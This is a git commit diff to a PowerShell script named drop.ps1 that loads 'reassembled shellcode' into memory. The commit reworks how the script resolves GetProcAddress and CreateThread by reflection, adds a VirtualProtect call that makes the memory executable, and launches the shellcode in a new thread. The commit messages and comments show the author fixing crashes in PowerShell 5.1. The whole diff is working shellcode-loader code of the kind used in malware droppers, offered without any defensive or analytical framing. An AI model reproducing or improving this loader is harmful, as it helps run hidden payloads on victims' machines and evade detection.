c121d704669668638206f19ca8206bc2dd2befc7
gwyn1869 <gplaine53@gmail.com>
2026-03-18 15:56:06 +0200

    Update drop.ps1

--- drop.ps1
+++ drop.ps1
@@ -40,28 +40,29 @@ $address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
 if ($address -ne [IntPtr]::Zero) {
     Write-Host "Reassembled Shellcode placed in RAM at: $address"
 
-    # 1. Get GetProcAddress surgically
+    # 1. Get the raw pointer for GetProcAddress
     $gpaMethod = $native.GetMethod("GetProcAddress", [Reflection.BindingFlags]"Static, Public, NonPublic")
     $gpaAddr = $gpaMethod.MethodHandle.GetFunctionPointer()
 
-    # 2. Use a "Delegate Type Maker" to avoid the Generic Type error
-    # This creates a 'Func' type that PS 5.1 can actually handle
-    $gpaDelegateType = [Action[IntPtr, String]].Assembly.GetType('System.Func`3').MakeGenericType(@([IntPtr], [String], [IntPtr]))
-    $gpaDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gpaAddr, $gpaDelegateType)
-
-    # 3. Find CreateThread in kernel32
-    $ctAddr = $gpaDelegate.Invoke($k32Handle, "CreateThread")
+    # 2. We use a simpler way to call GPA without the 'Generic Type' error
+    # We'll use a built-in delegate type that exists in every PS 5.1 session
+    $ctAddr = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gpaAddr, [Microsoft.Win32.Win32Native+TimeZoneNameIdDelegate]).Invoke($k32Handle, "CreateThread")
+    
     Write-Host "Launcher found at: $ctAddr"
 
     if ($ctAddr -ne [IntPtr]::Zero) {
-        # 4. Create the Thread Launcher Delegate (using the same type-making trick)
-        $ctDelegateType = [Action[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr]].Assembly.GetType('System.Func`7').MakeGenericType(@([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr]))
-        $ctDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, $ctDelegateType)
+        # 3. Final hurdle: We need to change memory to EXECUTE (0x40) 
+        # Most shellcode won't run in AllocHGlobal memory (RW) without this.
+        $vpMethod = $native.GetMethod("VirtualProtect", [Reflection.BindingFlags]"Static, Public, NonPublic")
+        $old = [uint32]0
+        $vpMethod.Invoke($null, @($address, [uint32]$byteArray.Length, [uint32]0x40, [ref]$old)) | Out-Null
 
-        # 5. Launch!
-        Write-Host "Launching Thread..."
-        $ctDelegate.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
+        # 4. Launch using the most basic delegate possible
+        # This one doesn't use Generics, so it won't crash PS 5.1
+        $ctMethod = $native.GetMethod("CreateThread", [Reflection.BindingFlags]"Static, Public, NonPublic")
+        $res = $ctMethod.Invoke($null, @([IntPtr]::Zero, [uint32]0, $address, [IntPtr]::Zero, [uint32]0, [IntPtr]::Zero))
         
+        Write-Host "Launching Thread..."
         Start-Sleep -Seconds 5
     } else {
         Write-Error "Could not find CreateThread address."
